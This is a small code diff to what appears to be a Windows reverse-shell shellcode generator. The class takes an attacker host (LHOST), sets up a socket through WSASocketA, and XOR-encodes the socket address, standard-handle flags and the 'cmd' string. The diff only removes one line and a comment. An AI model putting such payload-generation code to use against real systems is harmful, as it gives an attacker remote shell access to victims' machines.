@@ -128,7 +128,6 @@ class Shellcode():
         self.lhost = argv_dict['LHOST']
 
         # Set the EXITFUNC and update the necessary dependencies
-        self.exit_func = ""
         if "EXITFUNC" not in argv_dict.keys():
             self.exit_func = "terminate"
         else:
@@ -189,14 +188,6 @@ call_WSASocketA:
 
     mov esi, eax ; Save the socket file descriptor (sockfd)\n"""
 
-        # Generate a value that will be XOR'd by 0xFFFFFFFF in order to get the
-        # original value for:
-        #
-        #   sin_port | sin_family
-        #   STARTF_USESTDHANDLES
-        #   "cmd"
-        #
-        # These values will then have to be XOR'd by 0xFFFFFFFF
         sockaddr = hex(int(f"{sin_port}{sin_family}", 16))
         std_handles = hex(int(f"{processthreadsapi.STARTF_USESTDHANDLES}", 16))
 
